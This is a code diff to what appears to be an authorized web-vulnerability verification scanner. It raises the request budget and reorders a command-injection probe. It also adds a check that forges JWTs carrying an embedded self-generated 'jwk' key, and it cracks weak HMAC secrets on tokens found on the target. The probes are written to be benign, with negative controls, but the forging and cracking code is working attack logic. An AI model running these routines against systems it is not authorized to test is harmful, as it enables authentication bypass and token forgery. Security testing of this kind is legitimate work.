@@ -94,6 +94,22 @@ _REDIRECT_PARAMS = ("next", "redirect", "url", "returnurl", "return_url", "redir
 _XSS_PARAMS = ("q", "query", "search", "s", "keyword", "message", "name", "comment")
 _SSTI_PARAMS = ("q", "template", "tpl", "view", "theme", "preview", "name")
 _RCE_PARAMS = ("cmd", "command", "exec", "ping", "host", "ip", "domain", "query", "q")
+# Default per-pass request ceiling. Twelve could not seat the suite, and no ordering could fix that:
+# against a one-parameter URL the landing fetch, CORS, the three redirect probes and the three
+# host-header probes spend ten between them, so whichever injection check was ordered last got
+# nothing. Ordering could only ever choose WHICH class starved. A full sweep of the ~25 checks costs
+# on the order of 80-90 requests against a parametered endpoint, so this is sized to seat the whole
+# suite rather than to ration it — the operator's authorization, not an arbitrary default, is what
+# says a hundred benign requests to one target is acceptable.
+#
+# This is a ceiling, not a target: every check is self-gating (path-gated, signature-gated, or exits
+# on the first param that answers), so an ordinary target still costs far less. Politeness is still
+# ENFORCED rather than promised, by two things this does not touch: the inter-request floor
+# (GREYIQ_ACTIVE_MIN_INTERVAL_MS, 500ms) and the process-wide per-host token bucket
+# (GREYIQ_ACTIVE_MAX_REQUESTS_PER_HOST), which must stay above this or the bucket, not the budget,
+# becomes the real limit. Callers that size their own budget (the hunt loop's per-turn slice, the
+# re-plan wave) pass it explicitly and are unaffected.
+_DEFAULT_REQUESTS_BUDGET = 100
 _PATH_PARAMS = ("file", "filename", "path", "page", "template", "doc", "download", "attachment")
 _SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}
 # SQL-specific error signatures only — a generic stack trace is not SQL injection.
@@ -1190,14 +1206,21 @@ def _check_ssti(http: _Http, url: str, extra_params: list[str] | None = None) ->
     return None
 
 
-def _check_rce_command_injection(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
+def _check_rce_command_injection(http: _Http, url: str, extra_params: list[str] | None = None,
+                                 limit: int = 3, skip: int = 0) -> dict[str, Any] | None:
     """Confirm OS command injection with a BENIGN shell-substitution arithmetic probe: if the
     parameter reaches a shell, ``$(expr 111 + 111)`` / `` `expr 111 + 111` `` is evaluated and its
     result (222) echoed back. Only ``expr`` runs — no real command, no side effect. A literal
     control that is NOT substituted rules out a coincidental echo. GET-only; one marker per probe.
     This is the arithmetic-echo sibling of the SSTI check, for a shell context rather than a
-    template engine — the safe way to prove RCE without executing a real payload."""
-    params = _candidate_params(url, extra_params, _RCE_PARAMS, 3)
+    template engine — the safe way to prove RCE without executing a real payload.
+
+    ``limit`` / ``skip`` slice the candidate list so the suite can register this check TWICE: once
+    early with ``limit=1`` (a reserved two-request slot that guarantees the only CRITICAL class in
+    the suite is probed on its likeliest parameter before the budget is gone) and once later with
+    ``skip=1`` for the remaining parameters. The slice is taken AFTER ranking, so ``skip=1`` drops
+    exactly the parameter the reserved slot already covered and the pair never probes one twice."""
+    params = _candidate_params(url, extra_params, _RCE_PARAMS, limit)[max(0, int(skip)):]
     # BOTH substitution forms ($(...) and backticks) ride in ONE probe, each behind its own
     # marker — so this check costs exactly what SSTI does: one control + one probe per param.
     sig_dollar, sig_tick = f"{_MARK}D222", f"{_MARK}T222"
@@ -1214,7 +1237,11 @@ def _check_rce_command_injection(http: _Http, url: str, extra_params: list[str] 
         try:
             probe = http.fetch(_with_query(url, {param: probe_payload}))
         except _ActiveError:
-            break
+            # Skip THIS parameter, not the rest of them. _ActiveError is a transient network failure
+            # (budget exhaustion raises _RateLimited, which the caller handles), and the control fetch
+            # above already `continue`s on the same error — so breaking here threw away every remaining
+            # candidate because one probe hit a reset. Its SSTI sibling continues; so does this now.
+            continue
         body = probe.get("body") or ""
         if sig_dollar in body or sig_tick in body:
             hit_sig = sig_dollar if sig_dollar in body else sig_tick
@@ -1884,6 +1911,137 @@ def _check_jwt_alg_none(http: _Http, url: str, discovered_token: str = "") -> di
     return None
 
 
+def _rsa_jwk_and_signer() -> tuple[dict[str, str], Any] | None:
+    """A freshly generated RSA keypair as (public JWK dict, sign(bytes) -> signature).
+
+    The key is minted per probe and never leaves the process, so the "attacker key" in the proof is
+    demonstrably ours. Returns None when ``cryptography`` is unavailable — the same optional-dependency
+    treatment the alg-confusion check gives it, so the check simply does not fire rather than erroring.
+    """
+    try:
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.asymmetric import padding, rsa
+    except Exception:  # noqa: BLE001 - optional dep
+        return None
+    try:
+        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        numbers = key.public_key().public_numbers()
+    except Exception:  # noqa: BLE001 - a backend that cannot generate a key is a clean skip
+        return None
+
+    def _int_b64(value: int) -> str:
+        return _b64url_encode(value.to_bytes((value.bit_length() + 7) // 8 or 1, "big"))
+
+    jwk = {"kty": "RSA", "n": _int_b64(numbers.n), "e": _int_b64(numbers.e), "alg": "RS256", "use": "sig"}
+    return jwk, (lambda data: key.sign(data, padding.PKCS1v15(), hashes.SHA256()))
+
+
+def _check_jwt_jwk_embedded(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
+    """Confirm the server verifies a token with a key the TOKEN ITSELF carries (the ``jwk`` JOSE
+    header, CVE-2018-0114's class) — unauthenticated, total token forgery.
+
+    This is the sibling of ``_check_jwt_key_url_injection``'s out-of-band jku/x5u probe, for the case
+    where the attacker does not have to host anything at all: the key travels inside the token. Where
+    jku/x5u can only be observed out of band (the fetch is the tell), an embedded key needs no
+    collaborator and no infrastructure, so this one runs in the ordinary pass and fires on a hunt that
+    has no OOB configured. A vulnerable verifier reads the embedded public key, checks the signature
+    against it, and finds it valid — because we signed with the matching private key — so any identity
+    the claims assert is accepted.
+
+    Same discipline and the same token sources as ``_check_jwt_alg_none``, and the claims are NOT
+    touched: the forged token carries the real token's payload bytes verbatim, so what is proven is
+    that an attacker-chosen key verifies, never a privilege the operator granted themselves. The
+    differential is threefold — the real token authenticates, a corrupted-signature copy is REJECTED
+    (so the server does verify), and the self-signed copy is ACCEPTED with the same authenticated body.
+    """
+    found = _find_jwt_credential(http.auth)
+    baseline_headers: dict[str, str] | None = None
+    if found is not None:
+        header_name, real_token, rebuild = found
+    elif discovered_token and _JWT_RE.match(discovered_token):
+        header_name, real_token = "Authorization", discovered_token
+        rebuild = lambda new: f"Bearer {new}"  # noqa: E731
+        baseline_headers = {header_name: rebuild(real_token)}
+    else:
+        return None
+    parts = real_token.split(".")
+    if len(parts) != 3 or not all(parts):
+        return None
+    minted = _rsa_jwk_and_signer()
+    if minted is None:
+        return None  # no crypto backend -> nothing to sign with, so nothing to prove
+    jwk, sign = minted
+    try:
+        original_header = json.loads(_b64url_decode(parts[0]))
+    # RecursionError is a RuntimeError, not a ValueError: a crafted deeply nested header from an
+    # untrusted target token must be a clean skip, never a crash that aborts the pass.
+    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError, RecursionError):
+        return None
+    if not isinstance(original_header, dict):
+        return None
+    try:
+        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
+    except _ActiveError:
+        return None
+    if not (200 <= int(baseline.get("status") or 0) < 300):
+        return None
+    baseline_body = str(baseline.get("body") or "")
+    if len(" ".join(baseline_body.split())) < _JWT_MIN_BODY:
+        return None  # nothing substantive to differentiate against -> a bypass cannot be shown here
+    # Negative control FIRST: a corrupted signature under the token's OWN algorithm must be rejected.
+    # A server that accepts that is not verifying at all, which this check cannot attribute to jwk.
+    try:
+        control = http.fetch(url, extra_headers={
+            header_name: rebuild(f"{parts[0]}.{parts[1]}.{_corrupt_jwt_signature(parts[2])}")})
+    except _ActiveError:
+        return None
+    if 200 <= int(control.get("status") or 0) < 300:
+        return None
+    forged_header = {"alg": "RS256", "typ": str(original_header.get("typ") or "JWT"), "jwk": jwk}
+    if original_header.get("kid"):
+        forged_header["kid"] = original_header["kid"]  # some verifiers only consult jwk when kid matches
+    try:
+        head_b64 = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode("utf-8"))
+        signing_input = f"{head_b64}.{parts[1]}".encode("ascii")
+        forged = f"{head_b64}.{parts[1]}.{_b64url_encode(sign(signing_input))}"
+    except (TypeError, ValueError, UnicodeEncodeError):
+        return None
+    try:
+        probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
+    except _ActiveError:
+        return None
+    if not (200 <= int(probe.get("status") or 0) < 300):
+        return None
+    auth_body = str(probe.get("body") or "")
+    sim = _body_similar(auth_body, baseline_body)
+    if sim < _JWT_BODY_SAME:
+        # 2xx without the authenticated content: a verifying server can still answer 200 with a public
+        # page for a token it refused. Not a bypass.
+        return None
+    proof = _proof(
+        "confirmed", method=f"GET with a {header_name} token carrying an attacker-generated 'jwk' key",
+        affected_asset="every endpoint behind this authentication check — any identity can be signed",
+        observed_result=(f"a token signed with a freshly generated key, whose PUBLIC half was embedded in the "
+                         f"token's own 'jwk' header, was accepted (HTTP {probe['status']}) and returned the SAME "
+                         f"authenticated content as the real-token baseline ({sim:.0%} body match)"),
+        control_result=(f"a token with a corrupted signature under the original algorithm was rejected "
+                        f"(HTTP {control['status']}) — the server does verify signatures, it simply trusts the key "
+                        f"the token supplies"),
+        evidence="self-signed 'jwk' acceptance confirmed against a real-token baseline (body-matched), plus a corrupted-signature negative control",
+        limitations=("The claims were carried over from the real token unchanged, so this proves an attacker-chosen "
+                     "key is trusted — the identity/role fields were deliberately not altered."),
+    )
+    ev = {"request_line": f"GET {url}",
+          "request_header": f"{header_name}: <token with an embedded attacker 'jwk' public key>",
+          "response_status": f"HTTP {probe['status']}",
+          "matched_value": "self-signed token accepted — the verifier trusts the key carried in the token"}
+    if len(auth_body.strip()) >= 8:
+        ev["read_data"] = auth_body[:1200]
+    return _finding("active.jwt-jwk-embedded",
+                    "JWT 'jwk' header trusted — a self-signed token is accepted (arbitrary token forgery)",
+                    "critical", "jwt", "jwt", url, proof, ev)
+
+
 # Well-known JWKS locations to try (same-origin only) to recover the RSA PUBLIC key an RS256 token is
 # verified with — the key material the RS256->HS256 confusion attack HMAC-signs with.
 _JWKS_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration")
@@ -2073,15 +2231,31 @@ def _crack_jwt_hs_secret(token: str) -> tuple[str, str] | None:
     return None
 
 
-def _check_jwt_weak_secret(http: _Http, url: str) -> dict[str, Any] | None:
-    """Recover a weak HMAC signing secret for the operator's own JWT (OFFLINE, self-certifying),
-    then corroborate by signing a MINIMALLY-MODIFIED benign token the operator never issued and
-    showing the server accepts it. Opt-in-by-having-auth (never invents a session); no privilege
-    claim is tampered with. CRITICAL — a recovered secret forges arbitrary tokens."""
+def _check_jwt_weak_secret(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
+    """Recover a weak HMAC signing secret for a JWT (OFFLINE, self-certifying), then corroborate by
+    signing a MINIMALLY-MODIFIED benign token that was never issued and showing the server accepts
+    it. No privilege claim is tampered with. CRITICAL — a recovered secret forges arbitrary tokens.
+
+    The token is the operator's own credential when there is one, and OTHERWISE the token the TARGET
+    ITSELF handed back (the same source the alg:none and alg-confusion checks already use). Without
+    that second source this check was unreachable in the hunt the operator runs most — an
+    unauthenticated one — even though an app that hands an anonymous visitor an HS256 guest token and
+    signs it with 'secret' is precisely the case the offline cracker exists to catch, and the crack
+    costs zero requests. Opt-in-by-having-a-token either way; it still never invents a session."""
     found = _find_jwt_credential(http.auth)
-    if found is None:
+    baseline_headers: dict[str, str] | None = None
+    if found is not None:
+        header_name, real_token, rebuild = found
+    elif discovered_token and _JWT_RE.match(discovered_token):
+        header_name, real_token = "Authorization", discovered_token
+        rebuild = lambda new: f"Bearer {new}"  # noqa: E731
+        # The operator-credential path gets its authenticated baseline for free (_Http.fetch attaches
+        # the session same-site). A DISCOVERED token does not, so the baseline must carry the real
+        # token explicitly — otherwise the corroboration below would compare a forged-token response
+        # against an ANONYMOUS one and call a public 200 page "accepted".
+        baseline_headers = {header_name: rebuild(real_token)}
+    else:
         return None
-    header_name, real_token, rebuild = found
     cracked = _crack_jwt_hs_secret(real_token)
     if cracked is None:
         return None  # the offline crack IS the finding-cost; no crack -> silent, zero requests
@@ -2102,11 +2276,19 @@ def _check_jwt_weak_secret(http: _Http, url: str) -> dict[str, Any] | None:
     # failure keeps the finding confirmed (the crypto is the proof).
     server_note = "the recovered secret proves forgery offline (self-certifying); not sent to the server"
     try:
-        baseline = http.fetch(url)
+        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
         probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
         if 200 <= int(probe.get("status") or 0) < 300 and 200 <= int(baseline.get("status") or 0) < 300:
-            server_note = (f"a token forged with the recovered secret (a claim the operator never issued) was accepted "
-                           f"(HTTP {probe['status']}), matching the real-token baseline (HTTP {baseline['status']})")
+            # A 2xx pair is not acceptance on its own: a public page answers 200 for ANY Authorization
+            # header, forged or absent, so on the discovered-token path status alone would narrate a
+            # server-side accept that never happened. Require the forged response to carry the same
+            # content the real token returns — the identical gate the alg:none and alg-confusion
+            # checks apply before either calls a bypass proven.
+            same = _body_similar(str(baseline.get("body") or ""), str(probe.get("body") or ""))
+            if same >= _JWT_BODY_SAME:
+                server_note = (f"a token forged with the recovered secret (a claim that was never issued) was accepted "
+                               f"(HTTP {probe['status']}) and returned the same content as the real token "
+                               f"(HTTP {baseline['status']}, body match {same:.0%})")
     except _ActiveError:
         pass
     proof = _proof(
@@ -2419,12 +2601,26 @@ def _check_debug_endpoints(http: _Http, url: str) -> dict[str, Any] | None:
         body = probe.get("body") or ""
         status = int(probe.get("status") or 0)
         if 200 <= status < 300 and signature.search(body) and body != ctrl_body:
+            # What this check captures is always the same thing: the endpoint is SERVED, unauthenticated,
+            # and the catch-all control rules out an app that 200s everything. For the disclosure entries
+            # that IS the impact — the heap dump, the env listing and the log file are the secrets, and
+            # the captured body is the artifact. For the one entry classed `rce`, exposure is a precursor
+            # rather than the act: the class routes it through the RCE impact model (and its 9.8 vector),
+            # so the proof has to say plainly that nothing was executed. Reporting reachability as
+            # demonstrated execution is the exact over-claim the evidence rule exists to prevent, and a
+            # triager who reproduces this sees an exposed management port, not a running command.
+            limitations = ("" if class_hint != "rce" else
+                           f"Proves only that {name} answers unauthenticated at {path}. NOTHING was executed and no "
+                           f"MBean operation was invoked — the RCE classification is the documented reachability of "
+                           f"this endpoint, not a demonstrated code execution. Invoke one concrete, benign operation "
+                           f"(and stay inside the program's rules) before reporting this as proven RCE.")
             proof = _proof(
                 "confirmed", method=f"GET {path}",
                 affected_asset=why,
                 observed_result=f"{name} is served unauthenticated at {path} (HTTP {status}) with its characteristic response",
                 control_result="a non-existent control path did NOT return this content — the endpoint is genuinely exposed, not a catch-all 200",
                 evidence=f"the response carries the unmistakable {name} signature",
+                limitations=limitations,
             )
             ev = {"request_line": f"GET {origin}{path}", "response_status": f"HTTP {status}",
                   "matched_value": f"{name} exposed at {path}", "read_data": body[:1200]}
@@ -2438,7 +2634,7 @@ def verify_active(
     findings: list[dict[str, Any]],
     *,
     scope: str = "",
-    requests_budget: int = 12,
+    requests_budget: int = _DEFAULT_REQUESTS_BUDGET,
     settings: Any = None,
     governor: HostRateGovernor | None = None,
     http: _Http | None = None,
@@ -2530,7 +2726,12 @@ def verify_active(
         # introspection only fires on a graphql-shaped path.
         ("jwt", lambda: _check_jwt_alg_none(http, sanitized, discovered_token=discovered_jwt)),
         ("jwt", lambda: _check_jwt_alg_confusion(http, sanitized, discovered_token=discovered_jwt)),
-        ("jwt", lambda: _check_jwt_weak_secret(http, sanitized)),
+        ("jwt", lambda: _check_jwt_weak_secret(http, sanitized, discovered_token=discovered_jwt)),
+        # Embedded-key forgery: the token carries the public half of a key we just generated, so a
+        # verifier that trusts the jwk header validates a token we signed. Unlike the jku/x5u probe in
+        # oob_service it needs no collaborator and no hosted key, so it is the one total-forgery check
+        # that fires on a hunt with no out-of-band infrastructure configured at all.
+        ("jwt", lambda: _check_jwt_jwk_embedded(http, sanitized, discovered_token=discovered_jwt)),
         ("graphql", lambda: _check_graphql_introspection(http, sanitized)),
         # Schema disclosure via error field-suggestions — fires even when introspection is disabled,
         # so it catches the leak the introspection check misses. Graphql-path-gated, one benign query.
@@ -2538,15 +2739,33 @@ def verify_active(
         ("cors", lambda: _check_cors(http, sanitized)),
         ("redirect", lambda: _check_open_redirect(http, sanitized, discovered_params)),
         ("host-header", lambda: _check_host_header(http, sanitized)),
+        # RESERVED FIRST-PARAMETER SLOT for the only CRITICAL check in the suite. The param-keyed
+        # probes share a small budget and run to exhaustion in order, so POSITION alone decided whether
+        # a check ran at all: with the default 12-request budget, the landing fetch plus cors /
+        # redirect / host-header (up to 7 between them) and the two XSS passes (up to 6 each) reached
+        # the ceiling before command injection was ever called. On exactly the param-rich endpoints
+        # most likely to carry it, the highest-value class in the suite fired zero probes. The comment
+        # that used to sit on the full check claimed a priority it did not have ("ahead of the SQLi
+        # variants so a CRITICAL RCE gets request-budget priority") — sitting behind the XSS pair is
+        # what actually decided it.
+        #
+        # Simply moving the whole check up only MOVES the starvation onto XSS (the suite does not fit
+        # in one pass against a parametered URL, and cannot: a full sweep exceeds even the governor's
+        # per-host ceiling). A bigger budget is not free either — it drains the same process-wide
+        # per-host token bucket the fan-out to sibling endpoints draws from. So the scarce budget buys
+        # BREADTH first: two requests here guarantee the critical class is probed on its single
+        # likeliest parameter, and the full sweep below deepens onto the remaining parameters only if
+        # budget survives the rest of the suite. ``skip=1`` there means the two never re-probe the same
+        # parameter, so the guarantee costs nothing on a pass that would have reached the check anyway.
+        ("rce", lambda: _check_rce_command_injection(http, sanitized, discovered_params, limit=1)),
         ("xss", lambda: _check_reflected_xss(http, sanitized, discovered_params, priority=xss_params)),
         # Context-aware XSS runs right after the element-content check — catches the JS-string /
-        # attribute breakouts that check structurally can't confirm, spending budget only if it didn't fire.
+        # attribute breakouts that check structurally can't confirm.
         ("xss", lambda: _check_reflected_xss_context(http, sanitized, discovered_params, priority=xss_params)),
         ("ssti", lambda: _check_ssti(http, sanitized, discovered_params)),
-        # OS command injection via benign $(expr) shell substitution — arithmetic only, no real
-        # command runs. Sits next to SSTI (both are safe arithmetic-echo injection probes) and
-        # ahead of the SQLi variants so a CRITICAL RCE gets request-budget priority.
-        ("rce", lambda: _check_rce_command_injection(http, sanitized, discovered_params)),
+        # The rest of the command-injection sweep — parameters 2..N, the first one having already been
+        # probed by the reserved slot above.
+        ("rce", lambda: _check_rce_command_injection(http, sanitized, discovered_params, skip=1)),
         ("sqli", lambda: _check_error_sqli(http, sanitized, discovered_params)),
         ("sqli", lambda: _check_bool_sqli(http, sanitized, discovered_params)),
         ("nosqli", lambda: _check_nosqli(http, sanitized, discovered_params)),
